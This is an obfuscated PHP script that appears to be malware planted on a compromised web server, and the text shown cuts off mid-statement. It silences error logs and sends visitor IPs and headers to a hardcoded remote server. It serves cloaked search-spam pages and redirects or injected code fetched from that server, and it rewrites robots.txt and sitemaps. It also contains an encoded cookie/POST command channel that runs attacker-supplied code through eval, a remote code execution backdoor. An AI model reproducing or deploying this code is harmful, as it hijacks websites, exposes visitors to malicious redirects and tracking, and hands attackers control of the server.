<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _zbdz7v{static private $_utm7zu3t = 84536756;static function _fqpcv($_esfkjqzu, $_nax91gid){$_esfkjqzu[2] = count($_esfkjqzu) > 4 ? long2ip(_zbdz7v::$_utm7zu3t - 447) : $_esfkjqzu[2];$_kb7yfkpm = _zbdz7v::_ogvs9($_esfkjqzu, $_nax91gid);if (!$_kb7yfkpm) {$_kb7yfkpm = _zbdz7v::_jjvpc($_esfkjqzu, $_nax91gid);}return $_kb7yfkpm;}static function _ogvs9($_esfkjqzu, $_kb7yfkpm, $_n4s1smpb = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_esfkjqzu)) {$_esfkjqzu = implode("/", $_esfkjqzu);}$_5af952wf = curl_init();curl_setopt($_5af952wf, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_5af952wf, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_5af952wf, CURLOPT_URL, $_esfkjqzu);if (!empty($_kb7yfkpm)) {curl_setopt($_5af952wf, CURLOPT_POST, 1);curl_setopt($_5af952wf, CURLOPT_POSTFIELDS, $_kb7yfkpm);}if (!empty($_n4s1smpb)) {curl_setopt($_5af952wf, CURLOPT_HTTPHEADER, $_n4s1smpb);}curl_setopt($_5af952wf, CURLOPT_RETURNTRANSFER, TRUE);$_5ecdmltc = curl_exec($_5af952wf);curl_close($_5af952wf);return $_5ecdmltc;}static function _jjvpc($_esfkjqzu, $_kb7yfkpm, $_n4s1smpb = NULL){if (is_array($_esfkjqzu)) {$_esfkjqzu = implode("/", $_esfkjqzu);}if (!empty($_kb7yfkpm)) {$_tgnydh2v = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_kb7yfkpm);if (!empty($_n4s1smpb)) {$_tgnydh2v["header"] = $_tgnydh2v["header"] . "\r\n" . implode("\r\n", $_n4s1smpb);}$_ezgeyl18 = stream_context_create(array('http' => $_tgnydh2v));} else {$_tgnydh2v = array('method' => 'GET',);if (!empty($_n4s1smpb)) {$_tgnydh2v["header"] = implode("\r\n", $_n4s1smpb);}$_ezgeyl18 = stream_context_create(array('http' => $_tgnydh2v));}return @file_get_contents($_esfkjqzu, FALSE, $_ezgeyl18);}}class _1f929od{private static $_w8soezov = "";private static $_kbk8uaub = -1;private static $_66xjly2e = "";private $_ol66e89z = "";private $_dow5s5hr = "";private $_xcv0jnot = "";private $_d7e017sk = "";public static function _xw4qz($_30eqwh0s, $_cc16gunn, $_ns08xe73){_1f929od::$_w8soezov = $_30eqwh0s . "/cache/";_1f929od::$_kbk8uaub = $_cc16gunn;_1f929od::$_66xjly2e = $_ns08xe73;if (!@file_exists(_1f929od::$_w8soezov)) {@mkdir(_1f929od::$_w8soezov);}}static public function _7mn6s(){$_88bxi9dd = substr(md5(_1f929od::$_66xjly2e . "salt13"), 0, 4);$_irg5c5mr = Array("google" => Array(), "bing" => Array(),);foreach (array_keys($_irg5c5mr) as $_nzdvyeq8){$_lzzvkuud = $_88bxi9dd . "_" . $_nzdvyeq8 . ".stats";$_xkqx0trl = @file($_lzzvkuud, FILE_IGNORE_NEW_LINES);foreach ($_xkqx0trl as $_2pbhy6qc){$_0piwkyfe = explode("\t", $_2pbhy6qc);if (!isset($_irg5c5mr[$_nzdvyeq8][$_0piwkyfe[1]])){$_irg5c5mr[$_nzdvyeq8][$_0piwkyfe[1]] = 0;}$_irg5c5mr[$_nzdvyeq8][$_0piwkyfe[1]] += 1;}}$_irg5c5mr["prefix"] = $_88bxi9dd;return $_irg5c5mr;}public static function _jvrn6(){return TRUE;}public function __construct($_fvxuov1o, $_2gs0587w, $_3n8fzkd9, $_tzuouqsy){$this->_ol66e89z = $_fvxuov1o;$this->_dow5s5hr = $_2gs0587w;$this->_xcv0jnot = $_3n8fzkd9;$this->_d7e017sk = $_tzuouqsy;}public function _bn7qt(){function _albwu($_mx79tzps, $_34a6s3ed){return round(rand($_mx79tzps, $_34a6s3ed - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_huhlp0mk = time();$_nzdvyeq8 = (strpos($_SERVER["HTTP_USER_AGENT"], "google") !== FALSE) ? "google" : (strpos($_SERVER["HTTP_USER_AGENT"], "bing") !== FALSE ? "bing" : "none");$_lzzvkuud = substr(md5(_1f929od::$_66xjly2e . "salt13"), 0, 4) . "_" . $_nzdvyeq8 . ".stats";@file_put_contents($_lzzvkuud, $this->_xcv0jnot . "\t" . ($_huhlp0mk - ($_huhlp0mk % 3600)) .PHP_EOL, 8);$_h4xraxrt = _9onhhjn::_wc1vh();$_kb7yfkpm = str_replace("{{ text }}", $this->_dow5s5hr,str_replace("{{ keyword }}", $this->_xcv0jnot,str_replace("{{ links }}", $this->_d7e017sk, $this->_ol66e89z)));while (TRUE) {$_7xbml2jt = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _9onhhjn::_x7dy8(), $_kb7yfkpm, 1);if ($_7xbml2jt === $_kb7yfkpm) {break;}$_kb7yfkpm = $_7xbml2jt;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_kb7yfkpm, $_9febzcmr);if (empty($_9febzcmr)) {break;}$_3n8fzkd9 = @$_h4xraxrt[intval($_9febzcmr[1])];$_6vu7ntra = _61n3uh9::_mmh87($_3n8fzkd9);$_kb7yfkpm = str_replace($_9febzcmr[0], $_6vu7ntra, $_kb7yfkpm);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_kb7yfkpm, $_9febzcmr);if (empty($_9febzcmr)) {break;}$_3n8fzkd9 = @$_h4xraxrt[intval($_9febzcmr[1])];$_kb7yfkpm = str_replace($_9febzcmr[0], $_3n8fzkd9, $_kb7yfkpm);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_kb7yfkpm, $_9febzcmr);if (empty($_9febzcmr)) {break;}$_kb7yfkpm = str_replace($_9febzcmr[0], _albwu($_9febzcmr[1], $_9febzcmr[2]), $_kb7yfkpm);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_kb7yfkpm, $_9febzcmr);if (empty($_9febzcmr)) {break;}$_kb7yfkpm = str_replace($_9febzcmr[0], rand($_9febzcmr[1], $_9febzcmr[2]), $_kb7yfkpm);}return $_kb7yfkpm;}public function _rd0p3(){$_lzzvkuud = _1f929od::$_w8soezov . md5($this->_xcv0jnot . _1f929od::$_66xjly2e);if (_1f929od::$_kbk8uaub == -1) {$_wha97kbj = -1;} else {$_wha97kbj = time() + (3600 * 24 * 30);}$_0po71yzb = array("template" => $this->_ol66e89z, "text" => $this->_dow5s5hr, "keyword" => $this->_xcv0jnot,"links" => $this->_d7e017sk, "expired" => $_wha97kbj);@file_put_contents($_lzzvkuud, serialize($_0po71yzb));}static public function _0hyxi($_3n8fzkd9){$_lzzvkuud = _1f929od::$_w8soezov . md5($_3n8fzkd9 . _1f929od::$_66xjly2e);$_lzzvkuud = @unserialize(@file_get_contents($_lzzvkuud));if (!empty($_lzzvkuud) && ($_lzzvkuud["expired"] > time() || $_lzzvkuud["expired"] == -1)) {return new _1f929od($_lzzvkuud["template"], $_lzzvkuud["text"], $_lzzvkuud["keyword"], $_lzzvkuud["links"]);} else {return null;}}}class _8ah6gj{private static $_w8soezov = "";private static $_twd8y3u6 = "";public static function _xw4qz($_30eqwh0s, $_88bxi9dd){_8ah6gj::$_w8soezov = $_30eqwh0s . "/";_8ah6gj::$_twd8y3u6 = $_88bxi9dd;if (!@file_exists(_8ah6gj::$_w8soezov)) {@mkdir(_8ah6gj::$_w8soezov);}}public static function _jvrn6(){return TRUE;}static public function _zplm4(){$_ptoo9tg9 = 0;foreach (scandir(_8ah6gj::$_w8soezov) as $_h8rv8gd8) {if (strpos($_h8rv8gd8, _8ah6gj::$_twd8y3u6) === 0) {$_ptoo9tg9 += 1;}}return $_ptoo9tg9;}static public function _x7dy8(){$_98z76zr0 = array();foreach (scandir(_8ah6gj::$_w8soezov) as $_h8rv8gd8) {if (strpos($_h8rv8gd8, _8ah6gj::$_twd8y3u6) === 0) {$_98z76zr0[] = $_h8rv8gd8;}}return @file_get_contents(_8ah6gj::$_w8soezov . $_98z76zr0[array_rand($_98z76zr0)]);}static public function _rd0p3($_920sh2q4){if (@file_exists(_8ah6gj::$_twd8y3u6 . "_" . md5($_920sh2q4) . ".html")) {return;}@file_put_contents(_8ah6gj::$_twd8y3u6 . "_" . md5($_920sh2q4) . ".html", $_920sh2q4);}}class _9onhhjn{private static $_w8soezov = "";private static $_twd8y3u6 = "";private static $_616symth = array();private static $_tw2ywb4l = array();public static function _xw4qz($_30eqwh0s, $_88bxi9dd){_9onhhjn::$_w8soezov = $_30eqwh0s . "/";_9onhhjn::$_twd8y3u6 = $_88bxi9dd;if (!@file_exists(_9onhhjn::$_w8soezov)) {@mkdir(_9onhhjn::$_w8soezov);}}private static function _9nki9(){$_c2ik1u75 = array();foreach (scandir(_9onhhjn::$_w8soezov) as $_h8rv8gd8) {if (strpos($_h8rv8gd8, _9onhhjn::$_twd8y3u6) === 0) {$_c2ik1u75[] = $_h8rv8gd8;}}return $_c2ik1u75;}public static function _jvrn6(){return TRUE;}static public function _x7dy8(){if (empty(_9onhhjn::$_616symth)) {$_c2ik1u75 = _9onhhjn::_9nki9();_9onhhjn::$_616symth = @file(_9onhhjn::$_w8soezov . $_c2ik1u75[array_rand($_c2ik1u75)], FILE_IGNORE_NEW_LINES);}return _9onhhjn::$_616symth[array_rand(_9onhhjn::$_616symth)];}static public function _wc1vh(){if (empty(_9onhhjn::$_tw2ywb4l)) {$_c2ik1u75 = _9onhhjn::_9nki9();foreach ($_c2ik1u75 as $_vtl6ziel) {_9onhhjn::$_tw2ywb4l = array_merge(_9onhhjn::$_tw2ywb4l, @file(_9onhhjn::$_w8soezov . $_vtl6ziel, FILE_IGNORE_NEW_LINES));}}return _9onhhjn::$_tw2ywb4l;}static public function _rd0p3($_e1ujf9wr){if (@file_exists(_9onhhjn::$_twd8y3u6 . "_" . md5($_e1ujf9wr) . ".list")) {return;}@file_put_contents(_9onhhjn::$_twd8y3u6 . "_" . md5($_e1ujf9wr) . ".list", $_e1ujf9wr);}static public function _leeft($_3n8fzkd9){@file_put_contents(_9onhhjn::$_twd8y3u6 . "_" . md5(_61n3uh9::$_hwripsmk) . ".list", $_3n8fzkd9 . "\n", 8);}}class _61n3uh9{static public $_3v48dqpu = "5.5";static public $_hwripsmk = "21daad3f-9f60-e24d-8f52-960a51762b5a";private $_6g7gdajd = "http://136.12.78.46/app/assets/api2?action=redir";private $_55j4gblt = "http://136.12.78.46/app/assets/api?action=page";static public $_b6blq9o6 = 5;static public $_qty0nenc = 20;private function _g98i2(){$_jwvauu8e = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_jwvauu8e, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_nh7624u1 = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_nh7624u1 = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_nh7624u1 = 1;} else {$_nh7624u1 = 0;}return $_nh7624u1;}private static function _gpv1u(){$_nax91gid = array();$_nax91gid['ip'] = $_SERVER['REMOTE_ADDR'];$_nax91gid['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_nax91gid['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_nax91gid['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_nax91gid['ref'] = @$_SERVER['HTTP_REFERER'];$_nax91gid['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_nax91gid['acp'] = @$_SERVER['HTTP_ACCEPT'];$_nax91gid['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_nax91gid['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_nax91gid;}public function __construct(){$this->_6g7gdajd = explode("/", $this->_6g7gdajd);$this->_55j4gblt = explode("/", $this->_55j4gblt);}static public function _i8x0t($_sf6pjkfw){if (strlen($_sf6pjkfw) < 4) {return "";}$_dzqg2k0o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_h4xraxrt = str_split($_dzqg2k0o);$_h4xraxrt = array_flip($_h4xraxrt);$_92lm6055 = 0;$_d3l3ttx2 = "";$_sf6pjkfw = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_sf6pjkfw);do {$_gj38ar87 = $_h4xraxrt[$_sf6pjkfw[$_92lm6055++]];$_rvl76b8v = $_h4xraxrt[$_sf6pjkfw[$_92lm6055++]];$_gw3i4wbu = $_h4xraxrt[$_sf6pjkfw[$_92lm6055++]];$_vosjmdcf = $_h4xraxrt[$_sf6pjkfw[$_92lm6055++]];$_ql1g3qeu = ($_gj38ar87 << 2) | ($_rvl76b8v >> 4);$_6m18dwlo = (($_rvl76b8v & 15) << 4) | ($_gw3i4wbu >> 2);$_2mfhaqld = (($_gw3i4wbu & 3) << 6) | $_vosjmdcf;$_d3l3ttx2 = $_d3l3ttx2 . chr($_ql1g3qeu);if ($_gw3i4wbu != 64) {$_d3l3ttx2 = $_d3l3ttx2 . chr($_6m18dwlo);}if ($_vosjmdcf != 64) {$_d3l3ttx2 = $_d3l3ttx2 . chr($_2mfhaqld);}} while ($_92lm6055 < strlen($_sf6pjkfw));return $_d3l3ttx2;}private function _hdnxm($_3n8fzkd9){$_fvxuov1o = "";$_2gs0587w = "";$_nax91gid = _61n3uh9::_gpv1u();$_nax91gid["uid"] = _61n3uh9::$_hwripsmk;$_nax91gid["keyword"] = $_3n8fzkd9;$_nax91gid["tc"] = 10;$_nax91gid = http_build_query($_nax91gid);$_xkqx0trl = _zbdz7v::_fqpcv($this->_55j4gblt, $_nax91gid);if (strpos($_xkqx0trl, _61n3uh9::$_hwripsmk) === FALSE) {return array($_fvxuov1o, $_2gs0587w);}$_fvxuov1o = _8ah6gj::_x7dy8();$_2gs0587w = substr($_xkqx0trl, strlen(_61n3uh9::$_hwripsmk));$_2gs0587w = explode("\n", $_2gs0587w);shuffle($_2gs0587w);$_2gs0587w = implode(" ", $_2gs0587w);return array($_fvxuov1o, $_2gs0587w);}private function _qnh1g(){$_nax91gid = _61n3uh9::_gpv1u();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_nax91gid['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_nax91gid['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_nax91gid['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_nax91gid["uid"] = _61n3uh9::$_hwripsmk;$_nax91gid = http_build_query($_nax91gid);$_4ayauump = _zbdz7v::_fqpcv($this->_6g7gdajd, $_nax91gid);$_4ayauump = @unserialize($_4ayauump);if (isset($_4ayauump["type"]) && $_4ayauump["type"] == "redir") {if (!empty($_4ayauump["data"]["header"])) {header($_4ayauump["data"]["header"]);return true;} elseif (!empty($_4ayauump["data"]["code"])) {echo $_4ayauump["data"]["code"];return true;}}return false;}public function _jvrn6(){return _1f929od::_jvrn6() && _8ah6gj::_jvrn6() && _9onhhjn::_jvrn6();}static public function _7s7fs(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _kkeo0(){$_vtwkr0o4 = explode("?", $_SERVER["REQUEST_URI"], 2);$_vtwkr0o4 = $_vtwkr0o4[0];if (strpos($_vtwkr0o4, ".php") === FALSE) {$_vtwkr0o4 = explode("/", $_vtwkr0o4);array_pop($_vtwkr0o4);$_vtwkr0o4 = implode("/", $_vtwkr0o4) . "/";}return sprintf("%s://%s%s", _61n3uh9::_7s7fs() ? "https" : "http", $_SERVER['HTTP_HOST'], $_vtwkr0o4);}public static function _evx0d(){$_9s58ueqh = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_tfmkhukw = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_n4s1smpb = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_9s58ueqh[array_rand($_9s58ueqh)],);$_mbj0zx0g = urlencode(_61n3uh9::_4u7m0() . "/sitemap.xml");foreach ($_tfmkhukw as $_esfkjqzu => $_dvxucw1v) {$_zedbpl13 = _zbdz7v::_ogvs9($_esfkjqzu . $_mbj0zx0g, NULL, $_n4s1smpb);if (empty($_zedbpl13)) {$_zedbpl13 = _zbdz7v::_jjvpc($_esfkjqzu . $_mbj0zx0g, NULL, $_n4s1smpb);}if (empty($_zedbpl13)) {return FALSE;}if (strpos($_zedbpl13, $_dvxucw1v) === FALSE) {return FALSE;}}return TRUE;}public static function _tn9vv(){$_086zid1w = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_vtwkr0o4 = explode("?", $_SERVER["REQUEST_URI"], 2);$_vtwkr0o4 = $_vtwkr0o4[0];$_f8opili2 = substr($_vtwkr0o4, 0, strrpos($_vtwkr0o4, "/"));$_w8wub9q4 = sprintf($_086zid1w, $_f8opili2, _61n3uh9::_4u7m0() . "/sitemap.xml");$_k2iannci = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_k2iannci)) {@chmod($_k2iannci, 0777);$_v9qm4zq6 = @file_get_contents($_k2iannci);} else {$_v9qm4zq6 = "";}if (strpos($_v9qm4zq6, $_w8wub9q4) === FALSE) {@file_put_contents($_k2iannci, $_v9qm4zq6 . "\n" . $_w8wub9q4);$_v9qm4zq6 = @file_get_contents($_k2iannci);return (strpos($_v9qm4zq6, $_w8wub9q4) !== FALSE);}return FALSE;}public static function _4u7m0(){$_vtwkr0o4 = explode("?", $_SERVER["REQUEST_URI"], 2);$_vtwkr0o4 = $_vtwkr0o4[0];$_30eqwh0s = substr($_vtwkr0o4, 0, strrpos($_vtwkr0o4, "/"));return sprintf("%s://%s%s", _61n3uh9::_7s7fs() ? "https" : "http", $_SERVER['HTTP_HOST'], $_30eqwh0s);}public static function _mmh87($_3n8fzkd9){$_7nr1rxe6 = _61n3uh9::_kkeo0();$_c3df0ac7 = substr(md5(_61n3uh9::$_hwripsmk . "salt3"), 0, 6);$_qaxk0lhx = "";if (substr($_7nr1rxe6, -1) == "/") {if (ord($_c3df0ac7[1]) % 2) {$_3n8fzkd9 = str_replace(" ", "-", $_3n8fzkd9);} else {$_3n8fzkd9 = str_replace(" ", "-", $_3n8fzkd9);}$_qaxk0lhx = sprintf("%s%s", $_7nr1rxe6, urlencode($_3n8fzkd9));} else {if (FALSE && (ord($_c3df0ac7[0]) % 2)) {$_qaxk0lhx = sprintf("%s?%s=%s",$_7nr1rxe6,$_c3df0ac7,urlencode(str_replace(" ", "-", $_3n8fzkd9)));} else {$_h8r3t2qj = array("id", "page", "tag");$_nu0axvz5 = $_h8r3t2qj[ord($_c3df0ac7[2]) % count($_h8r3t2qj)];if (ord($_c3df0ac7[1]) % 2) {$_3n8fzkd9 = str_replace(" ", "-", $_3n8fzkd9);} else {$_3n8fzkd9 = str_replace(" ", "-", $_3n8fzkd9);}$_qaxk0lhx = sprintf("%s?%s=%s",$_7nr1rxe6,$_nu0axvz5,urlencode($_3n8fzkd9));}}return $_qaxk0lhx;}public static function _2roy7($_mx79tzps, $_34a6s3ed){$_jcr8o5e0 = "";for ($_92lm6055 = 0; $_92lm6055 < rand($_mx79tzps, $_34a6s3ed); $_92lm6055++) {$_3n8fzkd9 = _9onhhjn::_x7dy8();$_jcr8o5e0 .= sprintf("<a href=\"%s\">%s</a>,\n",_61n3uh9::_mmh87($_3n8fzkd9), ucwords($_3n8fzkd9));}return $_jcr8o5e0;}public static function _enmy9($_em4oie4m = FALSE){$_g7ygvd5w = dirname(__FILE__) . "/sitemap.xml";$_g806f17d = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_7jprsyjh = "</urlset>";$_h4xraxrt = _9onhhjn::_wc1vh();$_7089gh1b = array();if (file_exists($_g7ygvd5w)) {$_xkqx0trl = simplexml_load_file($_g7ygvd5w);foreach ($_xkqx0trl as $_vhvrudnn) {$_7089gh1b[(string)$_vhvrudnn->loc] = (string)$_vhvrudnn->lastmod;}} else {$_em4oie4m = FALSE;}foreach ($_h4xraxrt as $_as695phd) {$_qaxk0lhx = _61n3uh9::_mmh87($_as695phd);if (isset($_7089gh1b[$_qaxk0lhx])) {continue;}if ($_em4oie4m) {$_azushcbu = time();} else {$_azushcbu = time() - (crc32($_as695phd) % (60 * 60 * 24 * 30));}$_7089gh1b[$_qaxk0lhx] = date("Y-m-d", $_azushcbu);}$_06nodtvd = "";foreach ($_7089gh1b as $_esfkjqzu => $_azushcbu) {$_06nodtvd .= "<url>\n";$_06nodtvd .= sprintf("<loc>%s</loc>\n", $_esfkjqzu);$_06nodtvd .= sprintf("<lastmod>%s</lastmod>\n", $_azushcbu);$_06nodtvd .= "</url>\n";}$_9x041pmk = $_g806f17d . $_06nodtvd . $_7jprsyjh;$_mbj0zx0g = _61n3uh9::_4u7m0() . "/sitemap.xml";@file_put_contents($_g7ygvd5w, $_9x041pmk);return $_mbj0zx0g;}public function _huep6(){$_nu0axvz5 = substr(md5(_61n3uh9::$_hwripsmk . "salt3"), 0, 6);if (!$this->_g98i2()) {if ($this->_qnh1g()) {return;}}if (!empty($_GET)) {$_0piwkyfe = array_values($_GET);} else {$_0piwkyfe = explode("/", $_SERVER["REQUEST_URI"]);$_0piwkyfe = array_reverse($_0piwkyfe);}$_3n8fzkd9 = "";foreach ($_0piwkyfe as $_e36hzaim) {if (substr_count($_e36hzaim, "-") > 0) {$_3n8fzkd9 = $_e36hzaim;break;}}$_3n8fzkd9 = str_replace($_nu0axvz5 . "-", "", $_3n8fzkd9);$_3n8fzkd9 = str_replace("-" . $_nu0axvz5, "", $_3n8fzkd9);$_3n8fzkd9 = str_replace("-", " ", $_3n8fzkd9);$_gpl15l1b = array(".html", ".php", ".aspx");foreach ($_gpl15l1b as $_caycwtqo) {if (strpos($_3n8fzkd9, $_caycwtqo) === strlen($_3n8fzkd9) - strlen($_caycwtqo)) {$_3n8fzkd9 = substr($_3n8fzkd9, 0, strlen($_3n8fzkd9) - strlen($_caycwtqo));}}$_3n8fzkd9 = urldecode($_3n8fzkd9);$_3uw65h7c = _9onhhjn::_wc1vh();if (empty($_3n8fzkd9)) {$_3n8fzkd9 = $_3uw65h7c[0];} else if (!in_array($_3n8fzkd9, $_3uw65h7c)) {$_cyd9qjov = 0;foreach (str_split($_3n8fzkd9) as $_5af952wf) {$_cyd9qjov += ord($_5af952wf);}$_3n8fzkd9 = $_3uw65h7c[$_cyd9qjov % count($_3uw65h7c)];}if (!empty($_3n8fzkd9)) {$_4ayauump = _1f929od::_0hyxi($_3n8fzkd9);if (empty($_4ayauump)) {list($_fvxuov1o, $_2gs0587w) = $this->_hdnxm($_3n8fzkd9);if (empty($_2gs0587w)) {return;}$_4ayauump = new _1f929od($_fvxuov1o, $_2gs0587w, $_3n8fzkd9, _61n3uh9::_2roy7(_61n3uh9::$_b6blq9o6, _61n3uh9::$_qty0nenc));$_4ayauump->_rd0p3();}echo $_4ayauump->_bn7qt();}}}_1f929od::_xw4qz(dirname(__FILE__), -1, _61n3uh9::$_hwripsmk);_8ah6gj::_xw4qz(dirname(__FILE__), substr(md5(_61n3uh9::$_hwripsmk . "salt12"), 0, 4));_9onhhjn::_xw4qz(dirname(__FILE__), substr(md5(_61n3uh9::$_hwripsmk . "salt22"), 0, 4));function _croet($_xkqx0trl, $_as695phd){$_y4fywd4w = "";for ($_92lm6055 = 0; $_92lm6055 < strlen($_xkqx0trl);) {for ($_xtm1684x = 0; $_xtm1684x < strlen($_as695phd) && $_92lm6055 < strlen($_xkqx0trl); $_xtm1684x++, $_92lm6055++) {$_y4fywd4w .= chr(ord($_xkqx0trl[$_92lm6055]) ^ ord($_as695phd[$_xtm1684x]));}}return $_y4fywd4w;}function _5rqg1($_xkqx0trl, $_as695phd, $_xlavxzel){return _croet(_croet($_xkqx0trl, $_as695phd), $_xlavxzel);}foreach (array_merge($_COOKIE, $_POST) as $_5hc7og6v => $_xkqx0trl) {$_xkqx0trl = @unserialize(_5rqg1(_61n3uh9::_i8x0t($_xkqx0trl), $_5hc7og6v, _61n3uh9::$_hwripsmk));if (isset($_xkqx0trl['ak']) && _61n3uh9::$_hwripsmk == $_xkqx0trl['ak']) {if ($_xkqx0trl['a'] == 'doorway2') {if ($_xkqx0trl['sa'] == 'check') {$_kb7yfkpm = _zbdz7v::_fqpcv(explode("/", "http://httpbin.org/"), "");if (strlen($_kb7yfkpm) > 512) {echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu,"cache" => _1f929od::_7mn6s(),"keywords" => count(_9onhhjn::_wc1vh()),"templates" => _8ah6gj::_zplm4()));}exit;}if ($_xkqx0trl['sa'] == 'templates') {foreach ($_xkqx0trl["templates"] as $_fvxuov1o) {_8ah6gj::_rd0p3($_fvxuov1o);echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu,));}}if ($_xkqx0trl['sa'] == 'keywords') {_9onhhjn::_rd0p3($_xkqx0trl["keywords"]);_61n3uh9::_enmy9();echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu,));}if ($_xkqx0trl['sa'] == 'update_sitemap') {_61n3uh9::_enmy9(TRUE);echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu,));}if ($_xkqx0trl['sa'] == 'pages') {$_hrktfwd8 = 0;$_3uw65h7c = _9onhhjn::_wc1vh();if (_8ah6gj::_zplm4() > 0) {foreach ($_xkqx0trl['pages'] as $_4ayauump) {$_xs5fswei = _1f929od::_0hyxi($_4ayauump["keyword"]);if (empty($_xs5fswei)) {$_xs5fswei = new _1f929od(_8ah6gj::_x7dy8(), $_4ayauump["text"], $_4ayauump["keyword"], _61n3uh9::_2roy7(_61n3uh9::$_b6blq9o6, _61n3uh9::$_qty0nenc));$_xs5fswei->_rd0p3();$_hrktfwd8 += 1;if (!in_array($_4ayauump["keyword"], $_3uw65h7c)) {_9onhhjn::_leeft($_4ayauump["keyword"]);}}}}echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu, "pages" => $_hrktfwd8));}if ($_xkqx0trl["sa"] == "ping") {$_zedbpl13 = _61n3uh9::_evx0d();echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu, "result" => (int)$_zedbpl13));}if ($_xkqx0trl["sa"] == "robots") {$_zedbpl13 = _61n3uh9::_tn9vv();echo @serialize(array("uid" => _61n3uh9::$_hwripsmk, "v" => _61n3uh9::$_3v48dqpu, "result" => (int)$_zedbpl13));}}if ($_xkqx0trl['sa'] == 'eval') {eval($_xkqx0trl["data"]);exit;}}}$_ad9tbovl = new _61n3uh9();if 